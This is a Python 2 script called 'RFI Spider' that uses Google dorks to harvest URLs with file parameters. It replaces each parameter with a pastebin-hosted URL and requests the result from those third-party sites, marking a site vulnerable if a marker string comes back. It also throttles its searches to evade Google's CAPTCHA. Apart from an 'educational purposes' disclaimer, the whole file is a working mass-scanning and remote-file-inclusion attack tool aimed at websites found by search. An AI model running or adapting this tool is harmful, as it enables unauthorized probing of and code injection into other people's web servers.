import requests
from bs4 import BeautifulSoup
import re
import urllib2
import sys, getopt
from random import randint
from time import sleep

#
#Initial banner
#
def banner():
    print("""\

____________ _____   _____       _     _           
| ___ \  ___|_   _| /  ___|     (_)   | |          
| |_/ / |_    | |   \ `--. _ __  _  __| | ___ _ __ 
|    /|  _|   | |    `--. \ '_ \| |/ _` |/ _ \ '__|
| |\ \| |    _| |_  /\__/ / |_) | | (_| |  __/ |   
\_| \_\_|    \___/  \____/| .__/|_|\__,_|\___|_|   
                          | |                      
                          |_|                      

:: Automatic RFI crawler/scanner tool
:: Version 1.0
:: Author: Carlos Martin-Cleto

:: WARNING: This tool was written exclusively for educational purposes !!!
::          The author is not responsible for the misuse of this tool !!!

    """)

#
#Help Function
#
def help():
    print("""\
REQUIRED ARGUMENTS

-d <google dork>	E.g: -d index.php?page=main.php
	
OPTIONAL ARGUMENTS
    
-n <maximum number of Google search pages>  
-s <filename>		Save the URLs retreived by Google
		        into a .txt file.		         
-i <initial google search page>

Examples of usage:

rfispider.py -d index.php?page=contact.php
rfispider.py -d index.php?file=*.php -n 10
rfispider.py -d .php?view=*.php -n 10 -i 1

    """)

#
#Google Search method
#
def gsearch(dork, npages, start_page):
    found_urls = []
    user_agent = {'User-agent': 'Mozilla/5.0'}
    ### Each search result page shows 10 websites
    print "Looking URLs in Google ... \n"
    for start in range(start_page, (start_page + npages)):
        url = "https://www.google.com/search?q=%s&start=%s" % (dork, str(start*10))
	print "Looking into page: " + str(start)
	r = requests.get(url, headers = user_agent)    
	soup = BeautifulSoup(r.text, "html.parser")
	
	##CAPTCHA detection
	if r.text.find("Our systems have detected unusual traffic") != -1:
	    print "CAPTCHA detected !!!!\nBetter try from another IP..."
	    return found_urls
	    
	### Parse and clean URLs of current page
	raw_links = soup.find_all("a",href=re.compile("(?<=/url\?q=)(htt.*://.*)"))
	for link in raw_links:
	    if link["href"].find("webcache.googleusercontent.com") == -1:
	        nlink = link["href"].replace("/url?q=","")
		nlink = re.sub(r'&sa=.*', "", nlink)
		nlink = urllib2.unquote(nlink).decode('utf8')
		print nlink
		found_urls.append(nlink)
	### If less than 10 results there is no more pages
	if len(raw_links) < 10:
	    print "No more results were found\n"
	    return found_urls
	else:
	    sleep(randint(10,100))#Avoid Google captcha
    	
    return found_urls



#
#Look for vulnerable sites in the list passed as argument
#
def lookv(keydork, ulist):
    vuln_urls = []
    magic_s = "WbdyLZSx"
    kstring = '?'+ keydork + '='
    new_kstring = kstring + "http://pastebin.com/raw/7ZJHGwC3"
    mreg_exp = r"\?" + re.escape(keydork) + r"=.*"
    for url in ulist:
        try:
            #nurl = url.replace(kstring, new_kstring, 1)
	    nurl = re.sub(mreg_exp, new_kstring, url)
    	    print "Connecting: --> " + str(nurl)
            response = urllib2.urlopen(nurl)
            print "HTTP Response: " + str(response.getcode())
            html = response.read()
            print "Checking if it is vulnerable..."
            if html.find(magic_s) != -1:  # -1 will be returned when the magic_s is not found
                print "Vulnerable !!!!"
        	vuln_urls.append(nurl)
            else:
    	        print "No vulnerable :("
            response.close()
        except (urllib2.HTTPError) as e:
    	    print "HTTP Error: \n--------------"
            print e.getcode()
            pass
        except:
    	    print "Unknown error: \n-----------"
            pass
        
    return vuln_urls
        
#
#Main function
#
def main(argv):
    dork = ''
    npages = 10
    start_page = 0
   
    #Checking arguments
    try:
        opts, args = getopt.getopt(argv,"hd:n:")
    except getopt.GetoptError:
        print 'Usage: url_test.py -d <google dork>  [OPTIONS]'
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            help()
            sys.exit()
        elif opt == "-d":
            dork = arg
        elif opt == "-n":
            npages = arg
    
    banner()
    ndork = 'inurl:"'+dork+'"'    
    sdork = dork[dork.find("?")+1:dork.find("=")]
    url_list = gsearch(ndork, npages, start_page)
    vuln_list = lookv(sdork, url_list)
    
    
    print "Following are vulnerable URLs: \n"
    for i in vuln_list:
        print i


if __name__ == "__main__":
   main(sys.argv[1:])





#CODIGO PARA LEER URL DESDE UN TXT############################

#myfile = open('lista.txt', 'r')  # Open the file for reading.
#data = myfile.read()  # Read the contents of the file.
#myfile.close()  # Close the file since we're done using it.

# Return a list of the lines, breaking at line boundaries.
#url_list = data.splitlines()
#url_list = filter(None, url_list) #Remove empty rows
##############################################################		
		
		
		
